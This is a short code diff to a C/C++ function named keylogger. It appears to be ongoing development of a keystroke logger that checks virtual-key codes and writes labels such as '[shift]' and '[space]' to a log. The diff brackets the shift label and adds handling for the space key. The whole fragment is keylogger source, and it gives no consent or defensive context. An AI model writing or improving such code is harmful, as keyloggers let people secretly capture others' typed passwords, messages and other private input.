@@ -30,7 +30,7 @@ void keylogger(int durationInSeconds) {
                 else if (key == VK_RETURN)
                     writeToLog("[enter]");
                 else if (key == VK_SHIFT)
-                    writeToLog("shift");
+                    writeToLog("[shift]");
                 else if (key == VK_CONTROL)
                     writeToLog("[control]");
                 else if (key == VK_CAPITAL)
@@ -39,6 +39,8 @@ void keylogger(int durationInSeconds) {
                     writeToLog("[tab]");
                 else if (key == VK_MENU)
                     writeToLog("[alt]");
+                else if (key == VK_SPACE)
+                    writeToLog("[space]");
                 else if (key == VK_LBUTTON || key == VK_RBUTTON)
                     break;
                 else
